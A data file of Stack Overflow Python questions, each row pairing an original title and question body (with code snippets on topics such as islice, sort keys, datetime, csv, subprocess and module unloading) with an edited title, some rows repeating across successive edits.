Fast iterating over first n items of an iterable in python," I'm looking for a pythonic way of iterating over first n items of an iterable (upd: not a list in a common case, as for lists things are trivial), and it's quite important to do this as fast as possible. This is how I do it now: Doesn't seem neat to me. Another way of doing this is: This looks good, the question is it fast enough to use with some generator(s)? For example: Will it run fast enough as compared to the first method? Is there some easier way to do it? <code>  count = 0for item in iterable: do_something(item) count += 1 if count >= n: break for item in itertools.islice(iterable, n): do_something(item) pair_generator = lambda iterable: itertools.izip(*[iter(iterable)]*2)for item in itertools.islice(pair_generator(iterable), n): so_something(item)",Fast iterating over first n items of an iterable (not a list) in python
lambda vs. operator.attrGetter('xxx') as sort key in Python," I am looking at some code that has a lot of sort calls using comparison functions, and it seems like it should be using key functions.If you were to change seq.sort(lambda x,y: cmp(x.xxx, y.xxx)), which is preferable: or: I would also be interested in comments on the merits of making changes to existing code that works. <code>  seq.sort(key=operator.attrgetter('xxx')) seq.sort(key=lambda a:a.xxx)","""lambda"" vs. ""operator.attrgetter('xxx')"" as a sort key function"
lambda vs. operator.attrgetter('xxx') as sort key in Python," I am looking at some code that has a lot of sort calls using comparison functions, and it seems like it should be using key functions.If you were to change seq.sort(lambda x,y: cmp(x.xxx, y.xxx)), which is preferable: or: I would also be interested in comments on the merits of making changes to existing code that works. <code>  seq.sort(key=operator.attrgetter('xxx')) seq.sort(key=lambda a:a.xxx)","""lambda"" vs. ""operator.attrgetter('xxx')"" as a sort key function"
lambda vs. operator.attrgetter('xxx') as sort key function in Python," I am looking at some code that has a lot of sort calls using comparison functions, and it seems like it should be using key functions.If you were to change seq.sort(lambda x,y: cmp(x.xxx, y.xxx)), which is preferable: or: I would also be interested in comments on the merits of making changes to existing code that works. <code>  seq.sort(key=operator.attrgetter('xxx')) seq.sort(key=lambda a:a.xxx)","""lambda"" vs. ""operator.attrgetter('xxx')"" as a sort key function"
lambda vs. operator.attrgetter('xxx') as a sort key function in Python," I am looking at some code that has a lot of sort calls using comparison functions, and it seems like it should be using key functions.If you were to change seq.sort(lambda x,y: cmp(x.xxx, y.xxx)), which is preferable: or: I would also be interested in comments on the merits of making changes to existing code that works. <code>  seq.sort(key=operator.attrgetter('xxx')) seq.sort(key=lambda a:a.xxx)","""lambda"" vs. ""operator.attrgetter('xxx')"" as a sort key function"
"""lambda"" vs. ""operator.attrgetter('xxx')"" as a sort key function in Python"," I am looking at some code that has a lot of sort calls using comparison functions, and it seems like it should be using key functions.If you were to change seq.sort(lambda x,y: cmp(x.xxx, y.xxx)), which is preferable: or: I would also be interested in comments on the merits of making changes to existing code that works. <code>  seq.sort(key=operator.attrgetter('xxx')) seq.sort(key=lambda a:a.xxx)","""lambda"" vs. ""operator.attrgetter('xxx')"" as a sort key function"
optimize python code," I have code that uses the BeautifulSoup library for parsing, but it is very slow. The code is written in such a way that threads cannot be used. Can anyone help me with this?I am using BeautifulSoup for parsing and than save into a DB. If I comment out the save statement, it still takes a long time, so there is no problem with the database. Any suggestions?Note: I already ask this question here but that was closed due to incomplete information. <code>  def parse(self,text): soup = BeautifulSoup(text) arr = soup.findAll('tbody') for i in range(0,len(arr)-1): data=Data() soup2 = BeautifulSoup(str(arr[i])) arr2 = soup2.findAll('td') c=0 for j in arr2: if str(j).find(""<a href="") > 0: data.sourceURL = self.getAttributeValue(str(j),'<a href=""') else: if c == 2: data.Hits=j.renderContents() #and few others... c = c+1 data.save()",Optimizing BeautifulSoup (Python) code
Python: read streaming input from subprocess.communicate()," I'm using Python's subprocess.communicate() to read stdout from a process that runs for about a minute. How can I print out each line of that process's stdout in a streaming fashion, so that I can see the output as it's generated, but still block on the process terminating before continuing? subprocess.communicate() appears to give all the output at once. <code> ",Read streaming input from subprocess.communicate()
mysql LOAD DATA INFILE," I am trying to load a data file into mysql table using ""LOAD DATA LOCAL INFILE 'filename' INTO TABLE 'tablename'"".The problem is the source data file contains data of every fields but the primary key is missing ('id' column). I add a unique id field while I create the database but now I need to import the data into the table starting from the next field and auto increment the id field while importing. here is my LOAD query any ideas?Summary:create a table with an additional id field that would auto incrementload data (20 columns) into the table of 21 fields skipping the id fieldlet the id field automatically populate with an auto increment index. <code>  def create_table(): cursor.execute ("""""" CREATE TABLE variants ( id integer(10) auto_increment primary key, study_no CHAR(40), other fields..... ) """""") query1= ""LOAD DATA LOCAL INFILE '""+currentFile+""' INTO TABLE variants FIELDS TERMINATED BY '\\t' LINES TERMINATED BY '\\n'""",mysql LOAD DATA INFILE with auto-increment primary key
Convert Date String to DateTime Object in Python," I have following date: I need to know if this is date is before or after datetime(2009,04,01) and I can't seem to find a method that will convert that string to something that lets me compare it to datetime(2009,04,01) in a meaningful way. <code>  2005-08-11T16:34:33Z",How to convert a Date string to a DateTime object?
"str.format() does not work, keyError"," The following code raises a KeyError exception: Why?I am using Python 3.1. <code>  addr_list_formatted = []addr_list_idx = 0for addr in addr_list: # addr_list is a list addr_list_idx = addr_list_idx + 1 addr_list_formatted.append("""""" ""{0}"" { ""gamedir"" ""str"" ""address"" ""{1}"" } """""".format(addr_list_idx, addr))",str.format() raises KeyError
JSON sorting problem in Python," I've a problem with JSON in python.In fact, if I try to execute this code, python gives me a sorted JSON string! For example: And this is the output: As you can see, I tried to use ""sort_keys=False"" but nothing changed.How can I stop Python sorting my JSON strings? <code>  values = { 'profile': 'testprofile', 'format': 'RSA_RC4_Sealed', 'enc_key': base64.b64encode(chiave_da_inviare), 'request': base64.b64encode(data)}values_json = json.dumps(values, sort_keys = False, separators = (',', ':')) { ""profile"": ""testprofile"", ""enc_key"": ""GBWo[...]NV6w=="", ""request"": ""TFl[...]uYw=="", ""format"": ""RSA_RC4_Sealed""}",JSON output sorting in Python
Python datetime to Unix timestamp," I have to create an ""Expires"" value 5 minutes in the future, but I have to supply it in UNIX Timestamp format. I have this so far, but it seems like a hack. Is there a module or function that does the timestamp conversion for me? <code>  def expires(): '''return a UNIX style timestamp representing 5 minutes from now''' epoch = datetime.datetime(1970, 1, 1) seconds_in_a_day = 60 * 60 * 24 five_minutes = datetime.timedelta(seconds=5*60) five_minutes_from_now = datetime.datetime.now() + five_minutes since_epoch = five_minutes_from_now - epoch return since_epoch.days * seconds_in_a_day + since_epoch.seconds",Python Create unix timestamp five minutes in the future
Remove substring from a string," I want to remove the first characters from a string. Is there a function that works like this? <code>  >>> a = ""BarackObama"">>> print myfunction(4,a)ckObama>>> b = ""The world is mine"">>> print myfunction(6,b)rld is mine",Remove n characters from a start of a string
How do I attach event bindings to items on a canvas using Tkinter?," If I'm using a canvas to display data and I want the user to be able to click on various items on the canvas in order to get more information or interact with it in some way, what's the best way of going about this?Searching online I can find information about how to bind events to tags but that seems to be more indirect then what I want. I don't want to group items with tags, but rather have specific function calls when the user clicks specific items on the canvas. <code> ",How to bind events to Canvas items?
python date difference in minutes, How do I calculate the difference in time in minutes for the following timestamp in Python? <code>  2010-01-01 17:31:222010-01-03 17:31:22,Date difference in minutes in Python
Python unittest: Generate multiple tests programmatically?," Possible Duplicate: How do you generate dynamic (parameterized) unit tests in Python?I have a function to test, under_test, and a set of expected input/output pairs: I would like each one of these input/output pairs to be tested in its own test_* method. Is that possible?This is sort of what I want, but forcing every single input/output pair into a single test: (Also, do I really want to be putting that definition of self.expected_pairs in setUp?)UPDATE: Trying doublep's advice: This does not work. 0 tests are run. Did I adapt the example incorrectly? <code>  [(2, 332),(234, 99213),(9, 3),# ...] class TestPreReqs(unittest.TestCase): def setUp(self): self.expected_pairs = [(23, 55), (4, 32)] def test_expected(self): for exp in self.expected_pairs: self.assertEqual(under_test(exp[0]), exp[1])if __name__ == '__main__': unittest.main() class TestPreReqs(unittest.TestCase): def setUp(self): expected_pairs = [ (2, 3), (42, 11), (3, None), (31, 99), ] for k, pair in expected_pairs: setattr(TestPreReqs, 'test_expected_%d' % k, create_test(pair)) def create_test (pair): def do_test_expected(self): self.assertEqual(get_pre_reqs(pair[0]), pair[1]) return do_test_expectedif __name__ == '__main__': unittest.main()",Python library 'unittest': Generate multiple tests programmatically
Silent the stdout of a function in python without trashing sys.stdout and restoring each function call," Is there a way in Python to silence stdout without wrapping a function call like following?Original Broken Code: Edit: Corrected code from Alex Martelli That way works but appears to be terribly inefficient. There has to be a better way. Any ideas? <code>  from sys import stdoutfrom copy import copysave_stdout = copy(stdout)stdout = open('trash','w')foo()stdout = save_stdout import syssave_stdout = sys.stdoutsys.stdout = open('trash', 'w')foo()sys.stdout = save_stdout",Silence the stdout of a function in Python without trashing sys.stdout and restoring each function call
Silence the stdout of a function in python without trashing sys.stdout and restoring each function call," Is there a way in Python to silence stdout without wrapping a function call like following?Original Broken Code: Edit: Corrected code from Alex Martelli That way works but appears to be terribly inefficient. There has to be a better way. Any ideas? <code>  from sys import stdoutfrom copy import copysave_stdout = copy(stdout)stdout = open('trash','w')foo()stdout = save_stdout import syssave_stdout = sys.stdoutsys.stdout = open('trash', 'w')foo()sys.stdout = save_stdout",Silence the stdout of a function in Python without trashing sys.stdout and restoring each function call
Python: Filter a dictionary," I have a dictionary of points, say: I want to create a new dictionary with all the points whose x and y value is smaller than 5, i.e. points 'a', 'b' and 'd'.According to the the book, each dictionary has the items() function, which returns a list of (key, pair) tuple: So I have written this: Is there a more elegant way? I was expecting Python to have some super-awesome dictionary.filter(f) function... <code>  >>> points={'a':(3,4), 'b':(1,2), 'c':(5,5), 'd':(3,3)} >>> points.items()[('a', (3, 4)), ('c', (5, 5)), ('b', (1, 2)), ('d', (3, 3))] >>> for item in [i for i in points.items() if i[1][0]<5 and i[1][1]<5]:... points_small[item[0]]=item[1]...>>> points_small{'a': (3, 4), 'b': (1, 2), 'd': (3, 3)}",How to filter a dictionary according to an arbitrary condition function?
django: unit testing html response and sessions," Is there a way to test the html from the response of: I want a detailed check like input ids, and other attributes. Also, how about sessions that has been set? is it possible to check their values in the test? <code>  response = self.client.get('/user/login/')",django: unit testing html tags from response and sessions
How does Python's website generates it's online documentation?," Created using Sphinx 0.6.5.I know Python's documentation uses reStructuredText, but it has different sections like http://docs.python.org/whatsnew/2.6.html and http://docs.python.org/tutorial/index.html.How do you do this in reStructuredText? Do you run rst2html in a bunch of directories, keeping its structure?I know that it uses Sphinx (not rst2html directly as said by Thomas Wouters in an answer), but how you should organize your rst structure with source code files in a repository so you have a full blown automated doc website? <code> ",How does Python's website generate its online documentation?
Python constructor does weird things with optional parameters," Possible Duplicate: least astonishment in python: the mutable default argument I want to understand of the behavior and implications of the python __init__ constructor. It seems like when there is an optional parameter and you try and set an existing object to a new object the optional value of the existing object is preserved and copied. Look at an example:In the code below I am trying to make a tree structure with nodes and possibly many children . In the first class NodeBad, the constructor has two parameters, the value and any possible children. The second class NodeGood only takes the value of the node as a parameter. Both have an addchild method to add a child to a node.When creating a tree with the NodeGood class, it works as expected. However, when doing the same thing with the NodeBad class, it seems as though a child can only be added once!The code below will result in the following output: Que Pasa?Here is the Example: <code>  Good Tree123[< 3 >]Bad Tree122[< 2 >, < 3 >] #!/usr/bin/pythonclass NodeBad: def __init__(self, value, c=[]): self.value = value self.children = c def addchild(self, node): self.children.append(node) def __str__(self): return '< %s >' % self.value def __repr__(self): return '< %s >' % self.valueclass NodeGood: def __init__(self, value): self.value = value self.children = [] def addchild(self, node): self.children.append(node) def __str__(self): return '< %s >' % self.value def __repr__(self): return '< %s >' % self.valueif __name__ == '__main__': print 'Good Tree' ng = NodeGood(1) # Root Node rootgood = ng ng.addchild(NodeGood(2)) # 1nd Child ng = ng.children[0] ng.addchild(NodeGood(3)) # 2nd Child print rootgood.value print rootgood.children[0].value print rootgood.children[0].children[0].value print rootgood.children[0].children print 'Bad Tree' nb = NodeBad(1) # Root Node rootbad = nb nb.addchild(NodeBad(2)) # 1st Child nb = nb.children[0] nb.addchild(NodeBad(3)) # 2nd Child print rootbad.value print rootbad.children[0].value print rootbad.children[0].children[0].value print rootbad.children[0].children",Constructor does weird things with optional parameters
Possible to call single-parameter Python function without using parentheses? ," The Python documentation specifies that is is legal to omit the parentheses if a function only takes a single parameter, but generates a syntax error. So, what's the deal?EDIT:The statement that I read only applies to generator expressions:The parentheses can be omitted on calls with only one argument. <code>  myfunction ""Hello!""",Possible to call single-parameter Python function without using parentheses?
How do I embed an AppleScript in in a Python script?," I am trying to embed an AppleScript in a Python script. I don't want to have to save the AppleScript as a file and then load it in my Python script. Is there a way to enter the AppleScript as a string in Python and have Python execute the AppleScript? Thanks a bunch.Here is my script: import subprocess import re import os <code>  def get_window_title(): cmd = """"""osascript<<END tell application ""System Events"" set frontApp to name of first application process whose frontmost is true end tell tell application frontApp if the (count of windows) is not 0 then set window_name to name of front window end if end tell return window_name END"""""" p = subprocess.Popen(cmd, shell=True) p.terminate() return pdef get_class_name(input_str): re_expression = re.compile(r""(\w+)\.java"") full_match = re_expression.search(input_str) class_name = full_match.group(1) return class_nameprint get_window_title()",How do I embed an AppleScript in a Python script?
Run a python process in a separate thread," I'm looking for a quick bash script or program that will allow me to kick off a python script in a separate process. What's the best way to do this? I know this is incredibly simple, just curious if there's a preferred way to do it. <code> ",Run python in a separate process
Django: Meaning of leading underscore in list of tuples used to define choice fields?," I've seen a few examples defining choice fields like so: (Source: http://code.djangoproject.com/ticket/5446Also see: http://djangosnippets.org/snippets/494/)What is the meaning of the leading underscores? And why is the second value in the tuple even parenthesized? <code>  COUNTRIES = ( ('fr', _('France')), ('de', _('Germany')), ...)",Meaning of leading underscore in list of tuples used to define choice fields?
How to make a simple clipboard monitor in python," How can I make a simple clipboard monitor in Python using the PyGTK GUI?I found gtk.clipboard class and but I couldn't find any solution to get the ""signals"" to trigger the event when the clipboard content has changed.Any ideas? <code> ",PyGTK: how to make a clipboard monitor?
How can I recieve percent encoded slashes with Django on App Engine?," I'm using Django with Google's App Engine.I want to send information to the server with percent encoded slashes. A request like http:/localhost/turtle/waxy%2Fsmooth that would match against a URL like r'^/turtle/(?P<type>([A-Za-z]|%2F)+)$'. The request gets to the server intact, but sometime before it is compared against the regex the %2F is converted into a forward slash.What can I do to stop the %2Fs from being converted into forward slashes? Thanks! <code> ",How can I receive percent encoded slashes with Django on App Engine?
Convert hex to utf in Python, I have a hex string and i want to convert it utf8 to insert mysql. (my database is utf8) How can I do that? <code>  hex_string = 'kitap ara\xfet\xfdrmas\xfd'...result = 'kitap aratrmas',Decode string with hex characters in python 2
Don't we require Interfaces in dynamic languages, Is it just because of dynamic typing we don't require a concept of interfaces(like in Java and C#) in python? <code> ,Why don't we require interfaces in dynamic languages?
What is the difference between getiterator() and iterate() wrt to lxml.," As the question says, what would be the difference between:x.getiterator() and x.iter(), where x is an ElementTree or an Element? Cause it seems to work for both, I have tried it.If I am wrong somewhere, correct me please. <code> ",What is the difference between getiterator() and iter() wrt to lxml.
How can I filter non-Western letters in a Python unicode string?," I have a Python Unicode string. I want to make sure it only contains letters from the Roman alphabet (A through Z), as well as letters commonly found in European alphabets, such as , , , , , and . It should not contain characters from other alphabets (Chinese, Japanese, Korean, Arabic, Cyrillic, Hebrew, etc.). What's the best way to go about doing this?Currently I am using this bit of code, but I don't know if it's the best way: (I am using Python 2.5. I am also doing this in Django, so if the Django framework happens to have a way to handle such strings, I can use that functionality -- I haven't come across anything like that, however.) <code>  def only_roman_chars(s): try: s.encode(""iso-8859-1"") return True except UnicodeDecodeError: return False",How can I check if a Python unicode string contains non-Western letters?
The quest for completely unloaded module...," TL/DR: UPDATEI've contacted Python developers about this problem and indeed it's not going to be possible to unload a module completely ""in next five years"". (see the link) Please accept that Python indeed does not support unloading modules for severe, fundamental, insurmountable, technical problems, in 2.x.During my recent hunt for a memleak in my app, I've narrowed it down to modules, namely my inability to garbage collect an unloaded module. Using any method listed below to unload a module leaves thousands of objects in memory. In other words - I can't unload a module in Python... The rest of the question is attempt to garbage collect a module somehow.Let's try: Let's save a copy of sys.modules to attempt to restore it later.So, this is a baseline 4074 objects. We should ideally return to this somehow.Let's import a module: We're up to 7K non-garbage objects.Let's try removing httplib from sys.modules. Well, that didn't work. Hmm, but isn't there a reference in __main__? Oh, yeah: Hooray, down 300 objects. Still, no cigar, that's way more than 4000 original objects.Let's try restoring sys.modules from copy. Hmmm, well that was pointless, no change..Maybe if we wipe out globals... locals? What the.. what if we imported a module inside of exec? Now, that's not fair, it imported it into __main__, why? It should have never left the local_dict... Argh! We back to fully imported httplib.Maybe if we replaced it with a dummy object? Bloody.....!! Die modules, die!! Okay, after all attempts, the best is +2675 (nearly +50%) from starting point... That's just from one module... That doesn't even have anything big inside...Ok, now seriously, where's my error? How do I unload a module and wipe out all of it's contents?Or is Python's modules one giant memory leak?Full source in simpler to copy form: http://gist.github.com/450606 <code>  import gc, sysprint len(gc.get_objects()) # 4073 objects in memory# Attempt to unload the moduleimport httplibdel sys.modules[""httplib""]httplib = Nonegc.collect()print len(gc.get_objects()) # 6745 objects in memory import gcimport syssm = sys.modules.copy() # httplib, which we'll try to unload isn't yet # in sys.modules, so, this isn't the source of problemprint len(gc.get_objects()) # 4074 objects in memory import httplibprint len(gc.get_objects()) # 7063 objects in memory sys.modules.pop('httplib')gc.collect()print len(gc.get_objects()) # 7063 objects in memory del httplibgc.collect()print len(gc.get_objects()) # 6746 objects in memory sys.modules = smgc.collect()print len(gc.get_objects()) # 6746 objects in memory globals().clear()import gc # we need this since gc was in globals() toogc.collect()print len(gc.get_objects()) # 6746 objects in memory locals().clear()import gc # we need this since gc was in globals() toogc.collect()print len(gc.get_objects()) # 6746 objects in memory local_dict = {}exec 'import httplib' in local_dictdel local_dictgc.collect()print len(gc.get_objects()) # back to 7063 objects in memory from types import ModuleTypeimport sysprint len(gc.get_objects()) # 7064 objects in memory sys.modules['httplib'] = ModuleType('httplib')print len(gc.get_objects()) # 7066 objects in memory import httplibfor attr in dir(httplib): setattr(httplib, attr, None)gc.collect()print len(gc.get_objects()) # 6749 objects in memory",Unload a module in Python
Python: deecopy(list) vs new_list = old_list[:]," I'm doing exercise #9 from http://openbookproject.net/thinkcs/python/english2e/ch09.html and have ran into something that doesn't make sense.The exercise suggests using copy.deepcopy() to make my task easier but I don't see how it could. I'm confused why the book suggests using deepcopy() when a simple list[:] copies it. Am I using it wrong? Is my function completely out of wack?I also have some confusion returning values. the question is documents in the code above.TIA <code>  def add_row(matrix): """""" >>> m = [[0, 0], [0, 0]] >>> add_row(m) [[0, 0], [0, 0], [0, 0]] >>> n = [[3, 2, 5], [1, 4, 7]] >>> add_row(n) [[3, 2, 5], [1, 4, 7], [0, 0, 0]] >>> n [[3, 2, 5], [1, 4, 7]] """""" import copy # final = copy.deepcopy(matrix) # first way final = matrix[:] # second way li = [] for i in range(len(matrix[0])): li.append(0) # return final.append(li) # why doesn't this work? final.append(li) # but this does return final",Python: deepcopy(list) vs new_list = old_list[:]
Python sort (list/tuple) in list," I have some data either in a list of lists or a list of tuples, like this: And I want to sort by the 2nd element in the subset. Meaning, sorting by 2,5,8 where 2 is from (1,2,3), 5 is from (4,5,6). What is the common way to do this? Should I store tuples or lists in my list? <code>  data = [[1,2,3], [4,5,6], [7,8,9]]data = [(1,2,3), (4,5,6), (7,8,9)]",How to sort a list/tuple of lists/tuples by the element at a given index?
How to sort (list/tuple) of lists/tuples?," I have some data either in a list of lists or a list of tuples, like this: And I want to sort by the 2nd element in the subset. Meaning, sorting by 2,5,8 where 2 is from (1,2,3), 5 is from (4,5,6). What is the common way to do this? Should I store tuples or lists in my list? <code>  data = [[1,2,3], [4,5,6], [7,8,9]]data = [(1,2,3), (4,5,6), (7,8,9)]",How to sort a list/tuple of lists/tuples by the element at a given index?
How to sort (list/tuple) of lists/tuples by the element at a given index?," I have some data either in a list of lists or a list of tuples, like this: And I want to sort by the 2nd element in the subset. Meaning, sorting by 2,5,8 where 2 is from (1,2,3), 5 is from (4,5,6). What is the common way to do this? Should I store tuples or lists in my list? <code>  data = [[1,2,3], [4,5,6], [7,8,9]]data = [(1,2,3), (4,5,6), (7,8,9)]",How to sort a list/tuple of lists/tuples by the element at a given index?
How to call a default value in django and operate with it," [Update: Changed question title to be more specific]Sorry if I didn't make the question very well, I can't figure how to do this: Where callablefunction does this query: I want to automatically write the next number, and I don't know how to do it.I have errors from callablefunction stating that it cannot import the model, and I think there must be an easier way to do this. There's no need even to use this, but I can't figure how to do it with the pk number.I've googled about this and the only thing I found was to use the save() method for auto incrementing the number... but I wanted to show it in the <textfield> before saving...What would you do? <code>  class WhatEver(): number = model.IntegerField('Just a Field', default=callablefunction)... from myproject.app.models import WhatEverdef callablefunction(): no = WhatEver.objects.count() return no + 1",How to make an auto-filled and auto-incrementing field in django admin
Using Python's @property decorator on dicts," I'm trying to use Python's @property decorator on a dict in a class. The idea is that I want a certain value (call it 'message') to be cleared after it is accessed. But I also want another value (call it 'last_message') to contain the last set message, and keep it until another message is set. In my mind, this code would work: However, it doesn't seem to: I'm not sure what I have done wrong? It seems to me like @property doesn't work like I would expect it to on dicts, but maybe I'm doing something else fundamentally wrong?Also, I know that I could just use individual values in the class. But this is implemented as a session in a web application and I need it to be a dict. I could either make this work, or make the whole session object to pretend it's a dict, or use individual variables and hack it into workingness throughout the rest of the code base. I would much rather just get this to work. <code>  >>> class A(object):... def __init__(self):... self._b = {""message"": """", ... ""last_message"": """"}... @property... def b(self):... b = self._b... self._b[""message""] = """"... return b... @b.setter... def b(self, value):... self._b = value... self._b[""last_message""] = value[""message""]...>>> >>> a = A()>>> a.b[""message""] = ""hello"">>> a.b[""message""]''>>> a.b[""last_message""]''>>>",Using @property decorator on dicts
Python: Checking when shutil.copyfile is done," I have a such code: And here is the question, at #do further actions I use the copied f iles thus I need to make sure the shutil.copyfile functions finish their task. How can I make sure of this ? <code>  for file in file_list: shutil.copyfile(file,newpath)#do further actions",Checking when shutil.copyfile is done
Stop generator from block in Python," I have a generator that yields nodes from a Directed Acyclic Graph (DAG), depth first: I can iterate over the nodes like this I would like to be able to tell the generator, from the for loop, to stop from going deeper in the graph if some condition is met. I came up with the following solution, that use an external function. This solution forces me to declare variables I need before stop_crit is defined so they can be accessed from it.In Ruby, yield returns the last expression from the block so this could conveniently be used to tell the generator to continue or stop.What is the best way to achieve this functionality in Python? <code>  def depth_first_search(self): yield self, 0 # root for child in self.get_child_nodes(): for node, depth in child.depth_first_search(): yield node, depth+1 for node, depth in graph.depth_first_search(): # do something def depth_first_search(self, stop_crit=lambda n,d: False): yield self, 0 # root for child in self.get_child_nodes(): for node, depth in child.depth_first_search(): yield node, depth+1 if stop_crit(node, depth): break",Stop generator from within block in Python
Move an item inside a list? [Python]," In Python, how do I move an item to a definite index in a list? <code> ",Move an item inside a list?
How to eject CD using WMI?," Using Windows' WMI library, how can I eject CD rom mounted in a specific CD/DVD drive?I am asking for sources from WMI docs or examples since I am using wmi.py library on Python. It would be great if solution satisfies Windows computer newer than Windows 2000 and having multi CD-ROMs. (i.e. I have D: F: drives and both are CD-ROM drives. I might want to eject cd in F: specifically.)Searched on the net but could not find anything relevant. The last solution must be having 3rd party binaries and executing from the shell. <code> ",How to eject CD using WMI and Python?
csv in Python adding extra carriage return," The above code generates a file, test.csv, with an extra \r at each row, like so: instead of the expected Why is this happening, or is this actually the desired behavior? <code>  import csvwith open('test.csv', 'w') as outfile: writer = csv.writer(outfile, delimiter=',', quoting=csv.QUOTE_MINIMAL) writer.writerow(['hi', 'dude']) writer.writerow(['hi2', 'dude2']) hi,dude\r\r\nhi2,dude2\r\r\n hi,dude\r\nhi2,dude2\r\n","CSV in Python adding an extra carriage return, on Windows"
CSV in Python adding an extra carriage return," The above code generates a file, test.csv, with an extra \r at each row, like so: instead of the expected Why is this happening, or is this actually the desired behavior? <code>  import csvwith open('test.csv', 'w') as outfile: writer = csv.writer(outfile, delimiter=',', quoting=csv.QUOTE_MINIMAL) writer.writerow(['hi', 'dude']) writer.writerow(['hi2', 'dude2']) hi,dude\r\r\nhi2,dude2\r\r\n hi,dude\r\nhi2,dude2\r\n","CSV in Python adding an extra carriage return, on Windows"
Can python open a mp3 file, Is it possible to open an mp3 file in Python (possible using Popen) and I don't mean to run it in the program I mean as a separate window in media player or whatever just for it to open it when I call the function and if so how? <code> ,Can Python open a mp3 file using a separate media player?
Can Python open a mp3 file, Is it possible to open an mp3 file in Python (possible using Popen) and I don't mean to run it in the program I mean as a separate window in media player or whatever just for it to open it when I call the function and if so how? <code> ,Can Python open a mp3 file using a separate media player?
How to check if a library is 32bit/64bit built on Mac OS X," I'm having some trouble in using PyQt/SIP. I guess the SIP is compiled into 64bit, but Python has some problem with finding it. How do I know if a library (so/dylib) is 32bit or 64bit?How do I know if my Python is 32bit or 64bit? <code>  File ""qtdemo.py"", line 46, in import sipImportError: dlopen(/Library/Python/2.6/site-packages/sip.so, 2): no suitable image found. Did find: /Library/Python/2.6/site-packages/sip.so: mach-o, but wrong architecture",How to check if a library is 32bit/64bit built on Mac OS X?
How to get  charator in a string in python?, How can I get a (degree) character into a string? <code> ,How to get  character in a string in python?
How to get  charater in a string in python?, How can I get a (degree) character into a string? <code> ,How to get  character in a string in python?
What is the difference between struct_time and datetime in Python?," Is one preferred over the other? If so, in all cases or just a few?I am intending to use some form of date class for keeping long lists of date and time data, e.g. '2009-01-01 10:12:00'. <code> ",What are the differences between struct_time and datetime?
is None vs. ==None," I recently came across this syntax, I am unaware of the difference. I would appreciate it if someone could tell me the difference. <code> ","What is the difference between ""is None"" and ""== None"""
"What is the difference between "" is None "" and "" ==None """," I recently came across this syntax, I am unaware of the difference. I would appreciate it if someone could tell me the difference. <code> ","What is the difference between ""is None"" and ""== None"""
"Python : ""Static variable"" for a Type Object"," I have a small question about static variable and TypeObjects.I use the API C to wrap a c++ object (let's call it Acpp) that has a static variable called x.Let's call my TypeObject A_Object : The TypeObject is attached to my python module ""myMod"" as ""A"". I have defined getter and setters (tp_getset) so that I can access and modify the static variable of Acpp from python : This solution works but it's not really ""clean"". I would like to access the static variable in python by using the TypeObject and not the instances : Does anybody have an idea to help me ?Thanks in advance. <code>  typedef struct { PyObject_HEAD Acpp* a;} A_Object; >>> import myMod>>> myA1 = myMod.A(some args...)>>> myA1.x = 34 # using the setter to set the static variable of Acpp>>> myA2 = myMod.A(some other args...)>>> print myA2.x34>>> # Ok it works ! >>> import myMod>>> myMod.A.x = 34 # what I wish...","Python API C++ : ""Static variable"" for a Type Object"
Understanding some math relating to Euler #12," Note that this question contains some spoilers.A solution for problem #12 states that ""Number of divisors (including 1 and the number itself) can be calculated taking one element from prime (and power) divisors.""The (python) code that it has doing this is num_factors = lambda x: mul((exp+1) for (base, exp) in factorize(x)) (where mul() is reduce(operator.mul, ...).)It doesn't state how factorize is defined, and I'm having trouble understanding how it works. How does it tell you the number of factors of the number? <code> ",Understanding factorize function
Invert colormap in matplotlib, I would like to know how to simply reverse the color order of a given colormap in order to use it with plot_surface. <code> ,Reverse colormap in matplotlib
"Python Tkinter ""X"" button control (the button that close the window)"," When the user presses a close Button that I created, some tasks are performed before exiting. However, if the user clicks on the [X] button in the top-right of the window to close the window, I cannot perform these tasks. How can I override what happens when the user clicks [X] button? <code> ","Overriding Tkinter ""X"" button control (the button that close the window)"
"Overriding Python Tkinter ""X"" button control (the button that close the window)"," When the user presses a close Button that I created, some tasks are performed before exiting. However, if the user clicks on the [X] button in the top-right of the window to close the window, I cannot perform these tasks. How can I override what happens when the user clicks [X] button? <code> ","Overriding Tkinter ""X"" button control (the button that close the window)"
Proper use of Mutex's in python," I am starting with multi-threads in python (or at least it is possible that my script creates multiple threads). would this algorithm be the right usage of a Mutex? I haven't tested this code yet and it probably won't even work. I just want processData to run in a thread (one at time) and the main while loop to keep running, even if there is a thread in queue. Edit: re-reading my code I can see that it is grossly wrong. but hey, that's why I am here asking for help. <code>  from threading import Threadfrom win32event import CreateMutexmutex = CreateMutex(None, False, ""My Crazy Mutex"")while(1) t = Thread(target=self.processData, args=(some_data,)) t.start() mutex.lock()def processData(self, data) while(1) if mutex.test() == False: do some stuff break",Proper use of mutexes in Python
"how do I get a string format of the current date time, in python?"," For example, on July 5, 2010, I would like to calculate the string How should this be done? <code>  July 5, 2010","How do I get a string format of the current date time, in python?"
Can't get Syntastic vim plugin to work.," I've installed Syntastic plugin in vim. I can't get it to work. I've tried :SyntasticEnable but no luck. SyntasticEnable python in my vimrc doesn't work either (in fact, it doesn't even parse the command, an error is shown when I try to add it to my .vimrc : Not an editor command: SyntasticEnable python).How can I know what's going on? Syntastic isn't showing errors when I call it from vim. Does the first error (not and editor command in my .vimrc) indicates something I'm unaware of?I have in my .vimrc: I have a python.vim in ~/.vim/syntax_checkers as well. I can already use Pyflakes for python files, it works GREAT but I would like to have Syntastic functionality in other files/extensions I need when developing applications. <code>  set statusline+=%#warningmsg#set statusline+=%{SyntasticStatuslineFlag()}set statusline+=%*let g:syntastic_enable_signs=1let g:syntastic_auto_loc_list=1","Can't get ""Syntastic"" vim plugin to work."
Append elements with list of comprehension ," Having a list like this: is it possible, using list comprehension, to obtain this list as result? <code>  ['foo','spam','bar'] ['foo','ok.foo', 'spam', 'ok.spam', 'bar', 'ok.bar']",Prepend prefix to list elements with list comprehension
Append elements with list comprehension," Having a list like this: is it possible, using list comprehension, to obtain this list as result? <code>  ['foo','spam','bar'] ['foo','ok.foo', 'spam', 'ok.spam', 'bar', 'ok.bar']",Prepend prefix to list elements with list comprehension
Append prefix to list elements with list comprehension," Having a list like this: is it possible, using list comprehension, to obtain this list as result? <code>  ['foo','spam','bar'] ['foo','ok.foo', 'spam', 'ok.spam', 'bar', 'ok.bar']",Prepend prefix to list elements with list comprehension
python: How to remove all html tags from downloaded page, I have downloaded a page using urlopen. How do I remove all html tags from it? Is there any regexp to replace all <*> tags? <code> ,How to remove all html tags from downloaded page
